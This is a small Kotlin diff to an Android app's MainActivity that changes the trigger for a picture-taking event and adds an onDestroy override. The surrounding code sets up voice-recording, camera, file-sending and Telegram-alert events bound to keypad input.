@@ -88,7 +88,7 @@ class MainActivity : AppCompatActivity() {
                 StopRecordingEvent(arrayOf(*arr, "2"), voiceState, fileSender!!),
                 StartCameraEvent(arrayOf(*arr, "("), cameraState),
                 StopCameraEvent(arrayOf(*arr, ")"), cameraState),
-                TakePictureEvent(arrayOf(*arr, "0"), cameraState, fileSender!!),
+                TakePictureEvent(arrayOf("0"), cameraState, fileSender!!),
                 TelegramAlertEvent(
                     arrayOf(*arr, "3"),
                     props.getProperty("bot_api_key", ""),
@@ -179,6 +179,11 @@ class MainActivity : AppCompatActivity() {
         }
 
         setup()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        delegate.onDestroy()
     }
 
     private fun addToInputText(buttonValue: String): String {
